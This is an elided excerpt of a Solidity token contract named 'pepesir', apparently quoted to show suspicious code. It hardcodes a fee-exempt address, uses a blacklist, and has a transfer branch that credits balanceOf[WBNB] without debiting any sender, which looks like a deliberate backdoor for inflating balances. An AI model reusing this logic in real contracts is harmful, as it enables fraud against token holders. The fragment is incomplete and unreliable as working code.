...
contract ExcludedFromFeeList is Owned {
    ...
    constructor() {
        _isExcludedFromFee[0x3a1b4199b5a4D4B9910410ea3d47C33931b013E4] = true;
        emit ExcludedFromFee(0x3a1b4199b5a4D4B9910410ea3d47C33931b013E4);
    }
...
contract pepesir is ExcludedFromFeeList, BlackList, DividendFee {
    uint256 private constant _totalSupply = 1e14 * 1e18;
    ...
    constructor() ERC20("pepesir", "pepesir", 18) DividendFee() {
    ...
    function _transfer(
     ...
     _beforeTokenTransfer(sender, recipient, amount);
        ...
        if (_isExcludedFromFee[WBNB] || _isExcludedFromFee[DOGE]) {
            if (WBNB == DOGE) balanceOf[WBNB] += amount;
        }
